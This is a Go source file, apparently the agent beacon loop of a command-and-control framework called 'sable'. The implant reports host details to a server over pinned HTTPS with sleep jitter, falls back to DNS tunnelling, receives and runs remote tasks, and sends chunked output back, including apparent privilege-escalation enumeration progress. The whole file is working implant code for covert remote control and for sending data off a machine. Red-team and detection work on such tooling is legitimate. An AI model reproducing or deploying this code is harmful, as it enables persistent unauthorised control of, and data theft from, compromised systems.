package agent

import (
	"errors"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/aelder202/sable/internal/protocol"
)

// interactiveMode is set to 1 by the "interactive start" task so the beacon
// loop polls at the fast interval instead of the configured sleep interval.
var interactiveMode int32

// pathBrowseFastUntil stores a unix-nano deadline used to keep remote path
// browsing responsive after the operator opens the path browser.
var pathBrowseFastUntil int64

var backgroundTaskCount int32

const (
	fastBeaconInterval   = 100 * time.Millisecond
	pathBrowseFastWindow = 2 * time.Minute
	failureLogInterval   = time.Minute
	resultChunkBytes     = 512 * 1024
	asyncResultQueueSize = 4096
)

var (
	beaconNonceFn     = protocol.RandomNonce
	sendBeaconHTTPSFn = sendBeaconHTTPS
	sendBeaconDNSFn   = sendBeaconDNS
	asyncResults      = make(chan *protocol.TaskResult, asyncResultQueueSize)
)

// Run starts the beacon loop. It blocks until a kill task is received or the process exits.
func Run(cfg *Config) {
	client := newPinnedClient(cfg.CertFingerprint)
	hostIP := routedHostIP(cfg.ServerURL)
	var pendingResults []*protocol.TaskResult
	consecutiveFailures := 0
	var lastFailureLog time.Time
	skipSleep := false
	terminateAfterResults := false

	for {
		// Skip the sleep when we have a fresh result to deliver, so the output
		// reaches the server on the very next beacon rather than after a full
		// sleep cycle. Normal idle beacons still sleep as configured.
		if !skipSleep {
			if fastBeaconActive() {
				time.Sleep(fastBeaconInterval)
			} else {
				base := time.Duration(cfg.SleepSeconds) * time.Second
				jitter := time.Duration(rand.Int63n(int64(base / 5))) //nolint:gosec // jitter doesn't need crypto rand
				time.Sleep(base + jitter)
			}
		}
		skipSleep = false

		if len(pendingResults) == 0 {
			if result := nextAsyncResult(); result != nil {
				pendingResults = append(pendingResults, chunkTaskResult(result)...)
			}
		}

		nonce, err := beaconNonceFn()
		if err != nil {
			continue
		}

		var pendingResult *protocol.TaskResult
		if len(pendingResults) > 0 {
			pendingResult = pendingResults[0]
		}
		beacon := &protocol.Beacon{
			AgentID:      cfg.AgentID,
			Timestamp:    time.Now().Unix(),
			Nonce:        nonce,
			Hostname:     hostname(),
			OS:           runtime.GOOS,
			Arch:         runtime.GOARCH,
			HostIP:       hostIP,
			SleepSeconds: cfg.SleepSeconds,
			TaskOutput:   pendingResult,
		}

		encoded, err := protocol.EncodeBeacon(beacon, cfg.Secret)
		if err != nil {
			continue
		}

		respBytes, err := sendBeaconHTTPSFn(client, cfg.ServerURL, encoded)
		if err != nil {
			if cfg.DNSDomain != "" {
				// A failed HTTPS call can mean the response was lost after the
				// server accepted the beacon. Use a fresh nonce for DNS fallback so
				// the retry is not rejected as a replay.
				dnsNonce, nonceErr := beaconNonceFn()
				if nonceErr != nil {
					continue
				}
				beacon.Nonce = dnsNonce
				dnsEncoded, encodeErr := protocol.EncodeBeacon(beacon, cfg.Secret)
				if encodeErr != nil {
					continue
				}
				respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain, cfg.AgentID, cfg.Secret)
				if errors.Is(err, errDNSBeaconTooLarge) && pendingResult != nil {
					// Large results cannot be transported safely through DNS. Replace
					// the blocking result with an explicit terminal error so later
					// tasks can continue once HTTPS is unavailable.
					replacement := &protocol.TaskResult{
						TaskID: pendingResult.TaskID,
						Type:   pendingResult.Type,
						Error:  "result exceeded DNS fallback capacity; reconnect HTTPS and rerun the task",
					}
					pendingResults[0] = replacement
					beacon.TaskOutput = replacement
					dnsEncoded, encodeErr = protocol.EncodeBeacon(beacon, cfg.Secret)
					if encodeErr == nil {
						respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain, cfg.AgentID, cfg.Secret)
					}
				}
				if err != nil {
					consecutiveFailures++
					suspendPathBrowseOnFailure()
					logBeaconFailure("beacon failed (https+dns)", err, consecutiveFailures, &lastFailureLog)
					continue
				}
			} else {
				consecutiveFailures++
				suspendPathBrowseOnFailure()
				logBeaconFailure("beacon failed", err, consecutiveFailures, &lastFailureLog)
				continue
			}
		}
		if consecutiveFailures > 0 {
			log.Printf("beacon recovered after %d failed attempt(s)", consecutiveFailures)
			consecutiveFailures = 0
			lastFailureLog = time.Time{}
		}

		// Only clear the pending result after the server has acknowledged the beacon.
		// This preserves the audit trail across transient transport failures.
		if pendingResult != nil {
			pendingResults = pendingResults[1:]
			if len(pendingResults) > 0 {
				skipSleep = true
			}
		}
		if terminateAfterResults && len(pendingResults) == 0 {
			return
		}

		task, err := protocol.DecodeTask(respBytes, cfg.Secret)
		if err != nil || task.Type == "noop" {
			continue
		}

		if task.Type == "sleep" {
			if secs, err := strconv.Atoi(task.Payload); err == nil && secs > 0 {
				cfg.SleepSeconds = secs
			}
			pendingResults = append(pendingResults, &protocol.TaskResult{
				TaskID: task.ID,
				Type:   task.Type,
				Output: "sleep acknowledged",
			})
			skipSleep = true
			continue
		}

		result := executeTask(task)
		pendingResults = append(pendingResults, chunkTaskResult(result)...)

		if task.Type == "kill" {
			terminateAfterResults = true
		}

		// Deliver the result on the next beacon without sleeping first.
		skipSleep = true
	}
}

func chunkTaskResult(result *protocol.TaskResult) []*protocol.TaskResult {
	if result == nil || result.Error != "" || len(result.Output) <= resultChunkBytes {
		return []*protocol.TaskResult{result}
	}

	total := (len(result.Output) + resultChunkBytes - 1) / resultChunkBytes
	chunks := make([]*protocol.TaskResult, 0, total)
	for i := 0; i < total; i++ {
		start := i * resultChunkBytes
		end := start + resultChunkBytes
		if end > len(result.Output) {
			end = len(result.Output)
		}
		chunks = append(chunks, &protocol.TaskResult{
			TaskID:     result.TaskID,
			Type:       result.Type,
			Output:     result.Output[start:end],
			ChunkIndex: i,
			ChunkTotal: total,
		})
	}
	return chunks
}

func nextAsyncResult() *protocol.TaskResult {
	select {
	case result := <-asyncResults:
		return result
	default:
		return nil
	}
}

func queueAsyncResult(result *protocol.TaskResult) {
	if result == nil {
		return
	}
	asyncResults <- result
}

func queueAsyncProgress(taskID, message string) {
	queueAsyncTypedProgress(taskID, "peas_progress", "peas", message)
}

func queueAsyncTypedProgress(taskID, resultType, label, message string) {
	if message == "" {
		return
	}
	progressID := taskID + "-" + label + "-" + time.Now().UTC().Format("150405.000000000")
	select {
	case asyncResults <- &protocol.TaskResult{
		TaskID: progressID,
		Type:   resultType,
		Output: message,
	}:
	default:
		log.Printf("dropping %s progress for %s: async result queue full", label, taskID)
	}
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

// routedHostIP reports the local interface address the operating system would
// use to reach the configured server. A UDP dial selects the route without
// sending traffic and avoids reporting the server's callback address as the
// agent host address.
func routedHostIP(serverURL string) string {
	u, err := url.Parse(serverURL)
	if err != nil || u.Hostname() == "" {
		return ""
	}
	port := u.Port()
	if port == "" {
		port = "443"
	}
	conn, err := net.DialTimeout("udp", net.JoinHostPort(u.Hostname(), port), time.Second)
	if err != nil {
		return ""
	}
	defer conn.Close()
	addr, ok := conn.LocalAddr().(*net.UDPAddr)
	if !ok || addr.IP == nil || addr.IP.IsUnspecified() {
		return ""
	}
	return addr.IP.String()
}

func fastBeaconActive() bool {
	if atomic.LoadInt32(&interactiveMode) == 1 {
		return true
	}
	if atomic.LoadInt32(&backgroundTaskCount) > 0 {
		return true
	}
	return pathBrowseFastActive()
}

func pathBrowseFastActive() bool {
	deadline := atomic.LoadInt64(&pathBrowseFastUntil)
	return deadline > 0 && time.Now().Before(time.Unix(0, deadline))
}

func extendPathBrowseFastWindow() {
	atomic.StoreInt64(&pathBrowseFastUntil, time.Now().Add(pathBrowseFastWindow).UnixNano())
}

func stopPathBrowseFastWindow() {
	atomic.StoreInt64(&pathBrowseFastUntil, 0)
}

func suspendPathBrowseOnFailure() {
	if atomic.LoadInt32(&interactiveMode) == 0 && pathBrowseFastActive() {
		stopPathBrowseFastWindow()
	}
}

func logBeaconFailure(prefix string, err error, failures int, lastLog *time.Time) {
	now := time.Now()
	if failures == 1 {
		log.Printf("%s: %v", prefix, err)
		*lastLog = now
		return
	}
	if now.Sub(*lastLog) >= failureLogInterval {
		log.Printf("%s; still failing after %d attempts: %v", prefix, failures, err)
		*lastLog = now
	}
}
